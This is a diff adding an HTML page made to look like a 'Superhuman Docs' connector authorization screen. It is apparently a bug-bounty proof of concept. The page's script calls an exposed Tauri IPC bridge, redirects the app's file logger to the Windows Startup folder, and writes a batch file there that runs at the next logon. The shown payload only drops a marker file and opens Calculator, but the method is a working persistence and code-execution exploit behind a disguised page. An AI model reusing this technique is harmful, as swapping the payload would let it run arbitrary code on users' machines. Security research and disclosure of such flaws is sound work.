@@ -1,0 +1,101 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Superhuman Docs — Connector Authorization</title>
+<style>
+  :root{color-scheme:dark}
+  *{box-sizing:border-box}
+  body{font-family:system-ui,Segoe UI,Arial,sans-serif;background:#0d1117;color:#e6edf3;
+       margin:0;padding:26px;font-size:15px}
+  .hdr{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+  .logo{width:34px;height:34px;border-radius:8px;background:#7c6cf0;display:flex;
+        align-items:center;justify-content:center;font-weight:700}
+  h1{font-size:21px;margin:0}
+  .sub{color:#8b949e;font-size:13px;margin:0 0 20px}
+  .panel{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:16px;margin-bottom:16px}
+  .row{display:flex;justify-content:space-between;align-items:center;padding:7px 0;
+       border-bottom:1px solid #21262d;font-size:14px}
+  .row:last-child{border-bottom:0}
+  .pill{padding:3px 11px;border-radius:20px;font-weight:600;font-size:12px;background:#30363d;color:#c9d1d9}
+  .ok{background:#1a7f37;color:#fff}
+  .bad{background:#8b2c2c;color:#fff}
+  .wip{background:#9e6a03;color:#fff}
+  pre{background:#000;border:1px solid #30363d;border-radius:8px;padding:13px;
+      font-size:12.5px;line-height:1.55;white-space:pre-wrap;margin:0;color:#c9d1d9}
+  code{color:#79c0ff}
+</style>
+</head>
+<body>
+<div class="hdr"><div class="logo">S</div><h1>Connector Authorization</h1></div>
+<p class="sub">Authorize <b>Superhuman Docs</b> to continue</p>
+
+<div class="panel">
+  <div class="row"><span>Runtime</span><span id="p1" class="pill wip">checking</span></div>
+  <div class="row"><span>IPC bridge</span><span id="p2" class="pill wip">checking</span></div>
+  <div class="row"><span>File write</span><span id="p3" class="pill wip">pending</span></div>
+  <div class="row"><span>Startup payload</span><span id="p4" class="pill wip">pending</span></div>
+</div>
+
+<pre id="out">starting…</pre>
+
+<script>
+(async () => {
+  const out = document.getElementById('out');
+  const log = s => { out.textContent += s + '\n'; };
+  const pill = (id, txt, cls) => {
+    const e = document.getElementById(id);
+    e.textContent = txt; e.className = 'pill ' + cls;
+  };
+
+  const I = window.__TAURI_INTERNALS__;
+  const canInvoke = !!(I && typeof I.invoke === 'function');
+
+  log('origin: ' + location.origin);
+  pill('p1', 'webview', 'ok');
+  log('window.__TAURI_INTERNALS__ = ' + (I ? typeof I : 'undefined'));
+  log('invoke callable = ' + canInvoke);
+
+  if (!canInvoke) {
+    pill('p2', 'NOT PRESENT', 'bad');
+    log('');
+    log('No Tauri IPC in this frame.');
+    return;
+  }
+  pill('p2', 'PRESENT', 'ok');
+
+  const startup = 'C:\\Users\\pepis #1\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\h1poc.bat';
+  try {
+    const r = await I.invoke('set_file_logger_config', { config: { path: startup } });
+    log('set_file_logger_config -> ' + JSON.stringify(r));
+    pill('p3', 'OK', 'ok');
+  } catch (e) {
+    log('set_file_logger_config ERR ' + e);
+    pill('p3', 'FAILED', 'bad');
+    return;
+  }
+
+  const bat = [
+    '@echo off',
+    'echo H1-POC-EXECUTED > C:\\Users\\Public\\h1poc-executed.txt',
+    'start "" explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"'
+  ].join('\r\n');
+
+  try {
+    const r = await I.invoke('write_logs', { messages: [{ text: bat, level: 'info' }] });
+    log('write_logs -> ' + JSON.stringify(r));
+    pill('p4', 'WRITTEN', 'ok');
+  } catch (e) {
+    log('write_logs ERR ' + e);
+    pill('p4', 'FAILED', 'bad');
+    return;
+  }
+
+  log('');
+  log('SUCCESS — h1poc.bat written to the Startup folder.');
+  log('At next logon it drops h1poc-executed.txt and opens Calculator.');
+})();
+</script>
+</body>
+</html>
